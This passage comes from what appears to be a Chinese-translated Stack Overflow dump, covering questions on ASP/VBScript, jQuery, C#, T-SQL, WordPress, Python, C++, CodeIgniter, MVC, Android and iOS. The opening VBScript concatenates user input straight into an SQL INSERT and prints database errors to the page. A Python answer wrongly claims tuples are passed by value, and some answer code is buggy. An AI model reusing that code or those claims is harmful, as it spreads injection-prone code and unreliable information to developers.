        Db.ConnectionTimeout = Session("ConnectionTimeout")
        ' Set command timeout
        Db.CommandTimeout = Session("CommandTimeout")
        ' Open database
        Db.Open Session("ConnectionString")
    End If

    If isNull(SqlStatement) Or varType(SqlStatement) = vbEmpty Or IsObject(SqlStatement) = False Then
        ' Create a sql statement
        Set SqlStatement = Server.CreateObject("ADODB.Command")
        ' Set opened database as active connection for the SQL statement
        SqlStatement.ActiveConnection = Db
    End If
End Sub

' Close the database if it is not closed
Private Sub SqlClose()
    If Not isNull(SqlStatement) And varType(SqlStatement) <> vbEmpty And IsObject(SqlStatement) = True Then
        SqlStatement.ActiveConnection.Close
    End If

    Set SqlStatement = Nothing

    If Not isNull(Db) And varType(Db) <> vbEmpty And IsObject(Db) = True Then
        For Each objErr In Db.Errors
          response.write("<p>")
          response.write("Description: ")
          response.write(objErr.Description & "<br>")
          response.write("Help context: ")
          response.write(objErr.HelpContext & "<br>")
          response.write("Help file: ")
          response.write(objErr.HelpFile & "<br>")
          response.write("Native error: ")
          response.write(objErr.NativeError & "<br>")
          response.write("Error number: ")
          response.write(objErr.Number & "<br>")
          response.write("Error source: ")
          response.write(objErr.Source & "<br>")
          response.write("SQL state: ")
          response.write(objErr.SQLState & "<br>")
          response.write("</p>")
        Next
        Db.Close()
        Set Db = Nothing
    End If
End Sub

' Insert a user to the database
Public Function InsertUser(ByVal userObj)
    If isNull(userObject) Or varType(userObject) = vbEmpty Then
        InsertUser = -1
        Exit Function
    End If
    Call SqlInitDb()
    Set RS = Server.CreateObject("ADODB.Recordset")

    Dim sql
    sql = "INSERT INTO users(Firstname,Surname) VALUES ('"&userObj.getFirstname()&"','"&userObj.getSurname()&"')"
    SqlStatement.CommandText = sql
    SqlStatement.CommandType = 1

    ' Run the insert statement
    SqlStatement.Execute
    InsertUser = Err.Number
    Call SqlClose()
End Function 
```

SqlStatement 显然是一个对象，所以我不明白。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T07:35:43.403

VBScript 有很多方法可以将变量定义为空、空、无等。

您偶然发现的问题是*Nothing*实际上是一个对象。它不是空的，它不是空的，它是完全有效的对象，只是碰巧是一种特殊的类型。

因此，您的条件总是失败，即使变量是 Nothing，也会返回 False。

要解决此问题，请使用 VBScript 中唯一正确的方法来检查该特殊值：

```
If SqlStatement Is Nothing Then
    ' Create a sql statement
    Set SqlStatement = Server.CreateObject("ADODB.Command")
    ' Set opened database as active connection for the SQL statement
    SqlStatement.ActiveConnection = Db
End If 
```

唯一的缺点是您现在必须确保将变量初始化为*Nothing*，您现在就这样做，否则会抛出错误。

# javascript - 使用偏移量使 div 内容适合页面内容

> ID：15973412
> 
> 赞同：0
> 
> 时间：2013-04-12T14:04:20.003
> 
> 标签：javascript, jquery, offset, offsetheight

如果 div 中内容的高度超过了主 div 的高度，我们尝试使用 offset 调整高度，但徒劳无功。我们尝试了所有可能的方法，偏移顶部，偏移高度。

任何人都可以帮助我们获得正确的处理方式。我们要避免这条线是半可见的。

```
<!DOCTYPE html>
<html>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
 <style type="text/css" media="screen">
 body {background-color:white; font:16px Helvetica, Arial; color:black;}
.pagination {margin:auto; display:block; height:275px; width:300px; position:relative;      overflow:hidden; border:1px solid black;}
 </style>
<script>
$(document).ready(function() {
//$('.pagination').children().wrapAll('<div class="content"/>');
$('.next').click(function() {
    //console.log($('.content'));
    var height = 10;
    var displayHeight = $('.pagination').height();

    var contentNode = $('.content')[0];

    var currentDisplayHeight = 0;
    for(var i=0; i<contentNode.childNodes.length; i++)
    {
        var currentNode = contentNode.childNodes[i];
        //If it is not a text node
        if(currentNode.nodeType != 3)
        {
            //console.log(currentNode.offsetHeight > displayHeight);
            currentDisplayHeight = currentDisplayHeight + currentNode.offsetHeight;
            console.log(currentDisplayHeight);
            //passing current page
            if(currentDisplayHeight > displayHeight)
            {
                console.log(currentNode);
                console.log("Passing");
                //page 2
                currentDisplayHeight = currentNode.offsetHeight;

            }
        }
    }

    var current = ($('.content').css('margin-top') || '0px');
    //for(i=0; i<pag.
    $('.content').css('margin-top',current.substring(0,current.length-2) - $('.pagination').height() + 'px');
});
});

 </script>
 </head>
 <body>
 <div id="page" class="pagination" style="padding:5px">
<div class="content">
    <p>The House of Representatives shall be composed of Members chosen every second Year by the People of the several States, and the Electors in each State shall have the Qualifications requisite for Electors of the most numerous Branch of the State Legislature.</p>
    <p>No Person shall be a Representative who shall not have attained to the Age of twenty five Years, and been seven Years a Citizen of the United States, and who shall not, when elected, be an Inhabitant of that State in which he shall be chosen.</p>
    <p>(Representatives and direct Taxes shall be apportioned among the several States which may be included within this Union, according to their respective Numbers, which shall be determined by adding to the whole Number of free Persons, including those bound to Service for a Term of Years, and excluding Indians not taxed, three fifths of all other Persons.) (The previous sentence in parentheses was modified by the 14th Amendment, section 2.) The actual Enumeration shall be made within three Years after the first Meeting of the <span id="c" onclick="clk()">Congress</span> of the United States, and within every subsequent Term of ten Years, in such Manner as they shall by Law direct. The Number of Representatives shall not exceed one for every thirty Thousand, but each State shall have at Least one Representative; and until such enumeration shall be made, the State of New Hampshire shall be entitled to chuse three, Massachusetts eight, Rhode Island and Providence Plantations one, Connecticut five, New York six, New Jersey four, Pennsylvania eight, Delaware one, Maryland six, Virginia ten, North Carolina five, South Carolina five and Georgia three.</p>
    <p>When vacancies happen in the Representation from any State, the Executive Authority thereof shall issue Writs of Election to fill such Vacancies.</p>
    <p>The House of Representatives shall chuse their Speaker and other Officers; and shall have the sole Power of Impeachment.</p>
</div>
   </div>
    <ul>
    <li>Previous</li>
    <li class="next">Next</li>
<li><a href="" onclick="return test()">Click</a></li>
 </body>
 </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-28T03:42:45.617

您的内容对于 300 X 275 像素来说太大了。要包装内容，您必须减小字体大小或更改 CSS

```
 .pagination{height:AUTO;} 
```

# c# - 如何创建返回对象属性的 lambda 表达式，具有该属性的名称？

> ID：15973414
> 
> 赞同：2
> 
> 时间：2013-04-12T14:04:21.110
> 
> 标签：c#, .net, linq, lambda

我完全迷失了这个。我有一段代码在这样实现时可以满足我的需要：

```
return filters.Add(m => m.Metadata.RecordId).IsEqualTo(1); 
```

其中 m 是`TestObj`类对象，`Add`方法的参数是`Expression<Func<TestObj,bool?>>`。

现在的问题是我不能在 Add 中硬编码 m.Metadata.RecordId，因为我在这里得到的是一个字符串，它告诉我应该使用的属性，在本例中是“Metadata.RecordId”。我需要做的是用这个字符串构造这样一个表达式，它的作用与 m => m.Metadata.RecordId 一样。我需要这样的东西：

```
string propertyName = "Metadata.RecordId";
Expression expr = null;//create expression here somehow that will do the same as m => m.Metadata.RecordId
return filters.Add(expr).IsEqualTo(1); 
```

我怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:28:18.507

我不确定你到底想要什么作为输出（bool、int 和比较），
但这应该让你走上正确的轨道......

```
public static void Test(string propertyPath)
{
    var props = propertyPath.Split('.');
    Expression parameter = Expression.Parameter(typeof(TestObj), "x");
    Expression property = parameter;
    foreach (var propertyName in props)
        property = Expression.Property(property, propertyName);
    Expression<Func<TestObj, int>> lambdaExpression =
        Expression.Lambda<Func<TestObj, int>>(property, parameter as ParameterExpression);
    Add(lambdaExpression);
}
static void Add(Expression<Func<TestObj, int>> paramExp)
{
    TestObj obj = new TestObj { Metadata = new Metadata { RecordId = 1, Name = "test" } };
    var id = paramExp.Compile()(obj);
} 
```

您还可以查看 Jon 的这篇文章，它很好地描述了它是如何工作的……
[使用反射从属性 Name 中获取 lambda 表达式](https://stackoverflow.com/questions/7246715/use-reflection-to-get-lambda-expression-from-property-name/7246796#7246796)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:10:39.467

这个电话怎么样：

```
return filters.Add(m => ReflectionMagic(m, "Metadata.RecordId").IsEqualTo(1); 
```

该方法将具有以下签名：

```
public object ReflectionMagic(object source, string property); 
```

如果这样可行，您可以执行以下操作：

```
var propertyTree = property.Split('.');

foreach(var propertyName in propertyTree)
{
     var propInfo = source.GetType().GetProperty(propertyName);
     var source = propInfo.GetValue(source, null);
}

return source; 
```

请注意，缺少任何类型的参数和返回值检查，并留给读者作为练习。

# sql - SQL标量函数的效率

> ID：15973415
> 
> 赞同：0
> 
> 时间：2013-04-12T14:04:21.450
> 
> 标签：sql, performance, function

我有一个三库应用（没有一个是我开发的），里面存储了很多电话号码，但是它们的格式不一致（555-5555、（555）555-5555、5555555555、5555555等）在web端，我希望它们始终显示为 555-555-5555。我编写了一个标量函数来清理它们，但它会被称为 OFTEN，我担心它的效率。

你能看看，如果有更好的方法，请告诉我。

```
ALTER FUNCTION [dbo].[FormatPhone]
(
  @p AS VARCHAR(20)
) RETURNS VARCHAR(12) AS

BEGIN
DECLARE @ret AS VARCHAR(12) = ''
DECLARE @c AS CHAR
DECLARE @i AS INT
DECLARE @stop AS INT

-- loop to grab only digits from @p
SET @i = 1
SET @stop = LEN(@p)
WHILE @i <= @stop
BEGIN
    SET @c = SUBSTRING(@p, @i, 1)
    IF @c >= '0' AND @c <= '9' SET @ret = @ret + @c
    SET @i = @i + 1
END
IF LEN(@ret) = 7 SET @ret = '204' + @ret -- account for forgotten area code

SET @ret = LEFT(@ret, 3) + '-' + SUBSTRING(@ret, 4, 3) + '-' + RIGHT(@ret, 4)

RETURN @ret 
```

谢谢！缺口。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:13:08.623

你说的是数据清洗。以我的经验（我在一个俄罗斯业务部门进行了一个为期 6 个月的项目，其中大约 90% 都在电话号码格式问题上撞墙），这完全是痛苦的。

我对此的建议是做一次并正确地做；然后将系统放置到位，以防止将来脏数据进入系统。

我们最终做的是让行政办公室的几个女孩手工完成！问题是，如果你做错了，数据就会变得毫无用处。试一试自动解析，看看它会把你带到哪里，但有时人胜过机器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:09:53.200

*   替换除数字以外的所有字符
*   转换为样本 XXX-XXX-XXXX

使用 SUBSTRING，替换 T-SQL

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-23T17:28:04.320

此函数查看数字/字符串以确定大小和格式，没有循环

```
CREATE Function [dbo].[FormatPhone] (@PD varchar(50))
RETURNS Varchar(50)
As 
Begin

Declare @F1 As tinyint
Declare @F2 As tinyint
Declare @F3 As tinyint
Declare @F4 As tinyint
Declare @F5 As tinyint
Declare @F6 As tinyint

Declare @NPD As Varchar(50)

Declare @PDLen As tinyint

--Trim any space off the ends
SET @PD = RTRIM(LTRIM(@PD))

--Default just return the data, unless in proper foramt
SET @NPD = @PD

--Check for phone number that all ready has formatting, 
--we are only going to format a 'Pure' set of numbers.
--Check for formating, space 
SET @F1 = CHARINDEX('(', @PD)
SET @F2 = CHARINDEX(')', @PD)
SET @F3 = CHARINDEX('-', @PD)
SET @F4 = CHARINDEX('.', @PD)
SET @F5 = CHARINDEX(' ', @PD)
SET @F6 = @F1 +@F2 + @F3 + @F4 + @F5

IF @F6 = 0
--No formating, figure out the lenght
BEGIN
SET @PDLen = LEN(@PD)

    IF @PDLen = 10  SET @NPD = '('+SUBSTRING(@PD, 1, 3)+') '+SUBSTRING(@PD, 4, 3)+'-'+SUBSTRING(@PD, 7, 4)
    IF @PDLen = 11 AND SUBSTRING(@PD, 1, 1) = '1'  SET @NPD = '('+SUBSTRING(@PD, 2, 3)+') '+SUBSTRING(@PD, 5, 3)+'-'+SUBSTRING(@PD, 8, 4)
    IF @PDLen = 7  SET @NPD = '(   ) '+SUBSTRING(@PD, 1, 3)+'-'+SUBSTRING(@PD, 4, 4)

END

RETURN @NPD

END 
```

# css - 在修改后的 WordPress TwentyTwelve 中，子菜单在悬停时将父菜单项分开

> ID：15973419
> 
> 赞同：1
> 
> 时间：2013-04-12T14:04:34.187
> 
> 标签：css, wordpress, navigation

我正在开发一个使用修改版 TwentyTweve 主题的 WordPress 网站。

我的工作是修改导航下拉菜单，使其在悬停时出现下拉子菜单时将内容向下推。

问题：当子菜单下拉时，它们以某种方式将父菜单项分开。

我想强制父项保持原位。感谢 CSS / WordPress 大师的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:39:31.890

在 style.css 的第 1515 行中，您应该找到以下宽度属性：

```
width: 180px;
width: 12.85714286rem; 
```

这些是指定子菜单宽度和“将父菜单项分开”的属性。

# python - 元组构造函数与列表组合

> ID：15973420
> 
> 赞同：5
> 
> 时间：2013-04-12T14:04:34.173
> 
> 标签：python, list, tuples

就说我有一个清单

```
a = (3, 2, 9, 4) 
```

我想给每个数字加一个并存储结果，（之后我不需要操纵结果），我的第一个想法是去：

```
[x + 1 for x in a] 
```

但是关于：

```
tuple(x + 1 for x in a) 
```

元组是为了更快，对吧？如果我不需要在此代码更有效之后更改结果？还有它是如何工作的，`tuple`构造函数是否必须从生成器表达式中创建一个列表才能提前知道大小？提前感谢您的任何解释。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-12T14:11:43.970

只是`timeit()`：

```
In : a = (3, 2, 9, 4)

In : f1 = lambda: [x + 1 for x in a]

In : f2 = lambda: tuple(x + 1 for x in a)

In : timeit.timeit(f1)
Out: 0.595026969909668

In : timeit.timeit(f2)
Out: 2.360887050628662 
```

所以看起来元组构造函数变体需要大约四倍的时间，我猜是因为列表推导已经相当优化（在 cpython 中）。

但让我们仔细看看：

```
In : f3 = lambda: list(x + 1 for x in a)

In : timeit.timeit(f3)
Out: 2.5421998500823975 
```

因此这与元组构造所花费的时间大致相同，这表明性能损失在于生成器表达式的开销。（我们可以排除列表/元组构造，请参阅下面的编辑）

它甚至比列表慢两倍`map()`：

```
In : inc = partial(operator.add,1)

In : f4 = lambda:map(inc, a)

In : timeit.timeit(f4)
Out: 1.2346529960632324 
```

我认为这真的归结为（cpython）实现细节，所以不要依赖这个。无论如何 - 不要担心性能，它只是 2-4 的一个因素，使用最容易阅读的方法。

如果您真的遇到了性能瓶颈，请在注意到它们*后进行调查和优化。*我敢打赌，列表操作中的第 4 个因素将是您遇到的最少问题。

**编辑：** 有人提到“元组”的查找成本可能会导致减速，但事实并非如此：

```
In : f5 = lambda: tuple([x + 1 for x in a])

In : timeit.timeit(f5)
Out: 0.7900090217590332 
```

所以我想这确实是生成器表达式开销减慢了速度。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T14:15:47.117

该[`dis`](http://docs.python.org/2/library/dis.html)模块可以让您了解代码如何在内部执行......

`dis.dis(lambda a: [x + 1 for x in a])`产量...

```
 1           0 BUILD_LIST               0
              3 LOAD_FAST                0 (a)
              6 GET_ITER
        >>    7 FOR_ITER                16 (to 26)
             10 STORE_FAST               1 (x)
             13 LOAD_FAST                1 (x)
             16 LOAD_CONST               1 (1)
             19 BINARY_ADD
             20 LIST_APPEND              2
             23 JUMP_ABSOLUTE            7
        >>   26 RETURN_VALUE 
```

...和`dis.dis(lambda a: tuple(x + 1 for x in a))`产量...

```
 1           0 LOAD_GLOBAL              0 (tuple)
              3 LOAD_CONST               1 (<code object <genexpr> at 0x7f62e9eda930, file "<stdin>", line 1>)
              6 MAKE_FUNCTION            0
              9 LOAD_FAST                0 (a)
             12 GET_ITER
             13 CALL_FUNCTION            1
             16 CALL_FUNCTION            1
             19 RETURN_VALUE 
```

...但是您可能无法从中推断出太多东西。如果您想知道哪个更快，请查看该[`timeit`](http://docs.python.org/2/library/timeit.html)模块。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:16:23.530

在大多数情况下，tuple 和 list 之间的效率其实并没有什么太大的关系。如果你真的很在意它，你可以用它`timeit`来进行测试。

tuple 和 list 最重要的区别在于 tuple 是不可变的，而 list 是可变的。这意味着您可以更改列表的值，但不能使用元组进行更改。您可以散列元组，但不能使用列表。例如

```
k_tuple = ('a', 'b')
k_list = ['a', 'b']
d = {}
d[k_tuple] = 'c' # It is ok
d[k_list] = 'c' #It raise exception. 
```

更重要的是，当列表作为函数的参数时，它是通过引用分配的。当元组作为函数的参数时，它是按值分配的。

# c++ - 多线程安全使用 fstream 的选项有哪些

> ID：15973428
> 
> 赞同：1
> 
> 时间：2013-04-12T14:05:06.410
> 
> 标签：c++, multithreading, fstream

我正在创建自己的 IOsystem，它使用 fstream。会有很多线程，我的问题是如何保证它的安全，这意味着允许从一个文件中多次读取但保持独占写入。因此，例如，如果有两个线程要写入文件，我希望第二个线程等到第一个线程关闭其 fstream。在这里[Accessing a single file with multiple threads](https://stackoverflow.com/questions/1632470/accessing-a-single-file-with-multiple-threads) 建议使用 TMultiReadExclusiveWriteSynchronizer 但不确定它是否是最佳选择。我的一个想法是保留地图并在打开任何文件之前手动检查文件是否可以安全打开，如果不能让线程等到文件被释放。

编辑：有没有办法以独占模式打开 fstream？如果您认为 fstream 是在许多线程环境中使用的最差选择，还有哪些其他可能性？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:27:13.713

诸如互斥锁之类的同步原语很有帮助。例如引入的 C++11 标准库[`std::mutex`](http://en.cppreference.com/w/cpp/thread/mutex)和[`std::lock_guard`](http://en.cppreference.com/w/cpp/thread/lock_guard).

一种可能性是编写一个线程安全的包装器`operator<<`：

```
class FStreamWriter
{
    std::fstream *f;
    std::mutex mtx;
public:
    FStreamWriter(std::fstream *f) : f(f) {}

    template <typename T>
    FStreamWriter &operator<<(const T &x)
    {
        std::lock_guard<std::mutex> lock(mtx); // <- Mutex to make it safe-thread
        (*f) << x;
        return *this;
    }
   // ...
};

fstream file("my_file.txt");

// ...

FStreamWriter fwriter(&file); 
```

然后`fwriter`在各种线程中使用对象：

```
fwriter << "Hello" << 1 << 2 << 3; 
```

*如果您不使用 C++11，还有许多替代品，例如 Boost、Qt、POSIX、Windows-API 等，它们都具有互斥锁。但是它们的主要结构都是一样的*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-03T12:17:40.457

您应该使用低级 IO 库中的锁定机制，而不是使用互斥锁。因此，将文件名传递给您正在实现的流类，并使用文件名来制作您自己的 fstream 对象，但在执行 operator<< 时使用锁，所以这将始终有效，不需要线程只要。

构造函数：

打开文件获取文件描述符，将描述符传递给fstream构造函数

运算符<<：

使用 ::flock(fileDescriptor, LOCK_EX); 在 fstream<< 之前，不要忘记使用 ::flock(fileDecriptor, LOCK_UN);

# wordpress - 如何停止在 wordpress 中创建未使用的缩略图？

> ID：15973429
> 
> 赞同：2
> 
> 时间：2013-04-12T14:05:09.407
> 
> 标签：wordpress

我需要3 种不同尺寸的**特色**图片，我使用以下代码：

```
add_theme_support( 'post-thumbnails' );
add_image_size( 'thumb1', 700, 300, false );
add_image_size( 'thumb2', 300, 100, false );
add_image_size( 'thumb3', 60, 60, true ); 
```

但我需要这 3 种尺寸仅适用于特色图片，而不适用于放置在帖子内容中的图片。

上面的代码为帖子中的每张图片创建了 3 个未使用的缩略图，并且正在填满我的服务器！

如何对此进行编码，以便缩略图仅应用于特色图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-23T08:02:15.637

这是一个老问题，但如果有人再次遇到这个问题，你会用 WordPress 钩子来做。

像[https://github.com/crstauf/WordPress-FeaturedImage-SpecialImageSize/blob/master/functions.php](https://github.com/crstauf/WordPress-FeaturedImage-SpecialImageSize/blob/master/functions.php)这样的东西会起作用。

# php - 将 sql join 放在 CODEIGNITER 上的数组中

> ID：15973433
> 
> 赞同：-1
> 
> 时间：2013-04-12T14:05:15.737
> 
> 标签：php, mysql, codeigniter

我有两个表，用户和商场，有一列具有相同的名称，名称，我想加入它们，但我想将商场列存储在一个数组中，有点像这样：

```
$this->db->select('users.id, users.name, malls.name, malls.url');
$this->db->from('users');
$this->db->where('users.id', $id);
$this->db->join('malls', 'malls.id = users.mall_id'); 
```

结果是这样的：

```
$user = array(
        'id' => 1,
        'name' => 'Test user',
        'mall' => array('name' => 'Test mall', 'url' => 'blahblah.com')
    ); 
```

我在 ORM 上看到过它，就像 laravel 的 eloquent 一样，但我想在带有 ActiveRecord 的 codeigniter 上使用它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T15:13:22.893

我找到了答案，它是“急切加载”，而 Codeigniter 不支持。

# c# - MVC 视图中的 Foreach 中的 Foreach

> ID：15973434
> 
> 赞同：10
> 
> 时间：2013-04-12T14:05:19.803
> 
> 标签：c#, asp.net, asp.net-mvc, entity-framework, asp.net-mvc-4

大编辑：我已经编辑了我的完整帖子，答案是我在 Von V 和 Johannes 的帮助下提出的，非常感谢你们！！！！

我一直在尝试在我的索引视图中的 foreach 循环内执行一个 foreach 循环，以在手风琴中显示我的产品。让我告诉你我是如何尝试做到这一点的。

这是我的模型：

```
public class Product
{
    [Key]
    public int ID { get; set; }

    public int CategoryID { get; set; }

    public string Title { get; set; }

    public string Description { get; set; }

    public string Path { get; set; }

    public virtual Category Category { get; set; }
}

public class Category
{
    [Key]
    public int CategoryID { get; set; }

    public string Name { get; set; }

    public virtual ICollection<Product> Products { get; set; }
} 
```

这是~~一对一~~的关系，一个产品只有一个类别，但一个类别有很多产品。

在我看来，这是我正在尝试做的事情：

```
@model IEnumerable<MyPersonalProject.Models.Product>   

    <div id="accordion1" style="text-align:justify">
    @foreach (var category in ViewBag.Categories)
    {
        <h3><u>@category.Name</u></h3>

        <div>

            @foreach (var product in Model)
            {
                if (product.CategoryID == category.CategoryID)
                {
                    <table cellpadding="5" cellspacing"5" style="border:1px solid black; width:100%;background-color:White;">
                        <thead>
                            <tr>
                                <th style="background-color:black; color:white;">
                                    @product.Title  
                                    @if (System.Web.Security.UrlAuthorizationModule.CheckUrlAccessForPrincipal("/admin", User, "GET"))
                                    {
                                        @Html.Raw(" - ")  
                                        @Html.ActionLink("Edit", "Edit", new { id = product.ID }, new { style = "background-color:black; color:white !important;" })
                                    }
                                </th>
                            </tr>
                        </thead>

                        <tbody>
                            <tr>
                                <td style="background-color:White;">
                                    @product.Description
                                </td>
                            </tr>
                        </tbody>      
                    </table>                       
                }
            }

        </div>
    }  
</div> 
```

我不太确定这是正确的做法，但这几乎就是我想要做的。Foreach 类别，将该类别的所有产品放入手风琴选项卡中。

*   第一类

*   产品1
*   产品 3

*   第 2 类

*   产品 2
*   产品 4

*   第 3 类

*   产品 5

在这里，我将为~~我的一对一~~（感谢 Brian P）关系添加我的映射：

```
public class MyPersonalProjectContext : DbContext
{
    public DbSet<Product> Product { get; set; }
    public DbSet<Category> Category { get; set; }

    protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        modelBuilder.Conventions.Remove<PluralizingTableNameConvention>();

        modelBuilder.Entity<Product>();
        modelBuilder.Entity<Category>();
    }
} 
```

我还将添加我的控制器，以便您了解我是如何做到的：

```
public ActionResult Index()
    {
        ViewBag.Categories = db.Category.OrderBy(c => c.Name).ToList();
        return View(db.Product.Include(c => c.Category).ToList());
    } 
```

大编辑：我已经编辑了我的完整帖子，答案是我在 Von V 和 Johannes 的帮助下提出的，非常感谢你们！！！！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-12T14:22:42.600

假设您的控制器的操作方法是这样的：

```
public ActionResult AllCategories(int id = 0)
{
    return View(db.Categories.Include(p => p.Products).ToList());
} 
```

修改你的模型是这样的：

```
public class Product
{
    [Key]
    public int ID { get; set; }
    public int CategoryID { get; set; }
    //new code
    public virtual Category Category { get; set; }
    public string Title { get; set; }
    public string Description { get; set; }
    public string Path { get; set; }

    //remove code below
    //public virtual ICollection<Category> Categories { get; set; }
}

public class Category
{
    [Key]
    public int CategoryID { get; set; }
    public string Name { get; set; }
    //new code
    public virtual ICollection<Product> Products{ get; set; }
} 
```

然后，从现在开始，控制器将类别作为模型（而不是产品）：

```
foreach (var category in Model)
{
    <h3><u>@category.Name</u></h3>
    <div>
        <ul>    
            @foreach (var product in Model.Products)
            {
                // cut for brevity, need to add back more code from original
                <li>@product.Title</li>
            }
        </ul>
    </div>
} 
```

更新：将 ToList() 添加到控制器返回语句。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:13:50.203

你有：

```
foreach (var category in Model.Categories) 
```

接着

```
@foreach (var product in Model) 
```

基于该视图和模型，如果是，则似乎`Model`是类型`Product`，那么第二个`foreach`是无效的。实际上，如果您返回`Product`.

**更新：**

> 你是对的，我返回的是 Product 类型的模型。另外，既然您已经指出了，我确实明白出了什么问题。如果我不能这样做，我应该怎么做我想做的事情？

当您说要返回类型模型时，我很惊讶您的代码编译`Product`。以下是您的操作方法：

```
@foreach (var category in Model)
{
    <h3><u>@category.Name</u></h3>

    <div>
        <ul>    
            @foreach (var product in category.Products)
            {
                <li>
                    put the rest of your code
                </li>
            }
        </ul>
    </div>
} 
```

这表明您不要返回 a ，而是返回**带有 Products**`Product`的集合。在 EF 中是这样的：`Category`

 **```
// I am typing it here directly 
// so I'm not sure if this is the correct syntax.
// I assume you know how to do this,
// anyway this should give you an idea.
context.Categories.Include(o=>o.Product) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:12:45.883

尝试这个：

看起来您每次都在为每个产品循环，现在这是在循环每个与当前循环的类别具有相同类别 ID 的产品

```
<div id="accordion1" style="text-align:justify">
@using (Html.BeginForm())
{
    foreach (var category in Model.Categories)
    {
        <h3><u>@category.Name</u></h3>

        <div>
            <ul>    
                @foreach (var product in Model.Product.Where(m=> m.CategoryID= category.CategoryID)
                {
                    <li>
                        @product.Title
                        @if (System.Web.Security.UrlAuthorizationModule.CheckUrlAccessForPrincipal("/admin", User, "GET"))
                        {
                            @Html.Raw(" - ")  
                            @Html.ActionLink("Edit", "Edit", new { id = product.ID })
                        }
                        <ul>
                            <li>
                                @product.Description
                            </li>
                        </ul>
                    </li>
                }
            </ul>
        </div>
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-11-16T13:35:27.193

**控制器**

```
public ActionResult Index()
    {

        //you don't need to include the category bc it does it by itself
        //var model = db.Product.Include(c => c.Category).ToList()

        ViewBag.Categories = db.Category.OrderBy(c => c.Name).ToList();
        var model = db.Product.ToList()
        return View(model);
    } 
```

**查看**

您需要过滤给定类别的模型

像 :=> Model.where(p=>p.CategoryID == category.CategoryID)

尝试这个...

```
@foreach (var category in ViewBag.Categories)
{
    <h3><u>@category.Name</u></h3>

    <div>

        @foreach (var product in Model.where(p=>p.CategoryID == category.CategoryID))
        {

                <table cellpadding="5" cellspacing"5" style="border:1px solid black; width:100%;background-color:White;">
                    <thead>
                        <tr>
                            <th style="background-color:black; color:white;">
                                @product.Title  
                                @if (System.Web.Security.UrlAuthorizationModule.CheckUrlAccessForPrincipal("/admin", User, "GET"))
                                {
                                    @Html.Raw(" - ")  
                                    @Html.ActionLink("Edit", "Edit", new { id = product.ID }, new { style = "background-color:black; color:white !important;" })
                                }
                            </th>
                        </tr>
                    </thead>

                    <tbody>
                        <tr>
                            <td style="background-color:White;">
                                @product.Description
                            </td>
                        </tr>
                    </tbody>      
                </table>                       
            }

    </div>
} 
```**

# css - 在它下面做一个DIV重叠元素

> ID：15973435
> 
> 赞同：0
> 
> 时间：2013-04-12T14:05:24.003
> 
> 标签：css, overlap

我有一个 div，我使用 Prototypes 切换功能进行切换。这很好用。我遇到的问题是，当我切换 div 时，div 下方的元素在页面上移动。我希望他们留下来，我希望 div 与他们重叠。

我怎样才能做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:07:29.860

放在`position:absolute;`正在切换的 DIV 和`position:relative`所有 DIV 的容器上。

# android - Android MediaPlayer video seekTo 不更新预览

> ID：15973440
> 
> 赞同：2
> 
> 时间：2013-04-12T14:05:30.130
> 
> 标签：android, video, media-player

我需要寻找视频文件并查看我一直在寻找的视图框架。我使用默认的 Andoid MediaPlayer 类。播放效果很好，但是当我尝试调用 seekTo 方法时，我的 Surface 视图保持不变，第一帧。

这是我的代码：

```
mediaPlayer.seekTo(offset);
mediaPlayer.setOnSeekCompleteListener(new MediaPlayer.OnSeekCompleteListener() {
                @Override
                public void onSeekComplete(MediaPlayer mPlayer) {
                    Log.w("mediaPlayer", "onSeekComplete" );
                }
}); 
```

我有双倍的偏移值——这正是我需要的。回调有效 - 我在 logcat 中看到消息。

但是无论偏移值如何，我的 SurfaceView 中的图片都保持不变。

我尝试在 onSeekComplete 被触发时开始和暂停播放。但它导致什么都没有..

```
mediaPlayer.seekTo(offset);
mediaPlayer.setOnSeekCompleteListener(new MediaPlayer.OnSeekCompleteListener() {
                @Override
                public void onSeekComplete(MediaPlayer mPlayer) {
                    mediaPlayer.start();
                    mediaPlayer.pause();
                    Log.w("mediaPlayer", "onSeekComplete" );
                }
}); 
```

如果我打电话给 mediaPlayer.start(); 播放开始没有问题。

# ios - 通过 Url Scheme 重新打开 iOS 应用程序 - 状态保存

> ID：15973451
> 
> 赞同：20
> 
> 时间：2013-04-12T14:05:55.543
> 
> 标签：ios, objective-c

我将用户从我的应用程序发送到浏览器，然后通过我的自定义 URL 将他们返回到应用程序。问题是：一旦我返回，我所有的实例变量都是空的！接口被保留（正如我使用 Storyboard 以来所期望的那样），但值（文本字段、实例变量等）是不可访问的……它们返回 null。

这是怎么回事？？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-01-09T14:52:11.433

（自从我遇到这个问题以来已经有一段时间了，但这是我认为发生的事情......）

在我的应用程序委托的 openURL 方法中处理返回 URL 的调用时，我尝试调用我的视图控制器的方法作为响应，并通过创建该方法的视图控制器的实例来实现。由于我没有访问当前实例，因此我基本上创建了该视图控制器的第二个空白实例。

在这种情况下，我最终使用 an`NSNotification`而不是直接调用该方法。我绝对认为这是最优雅的解决方案。

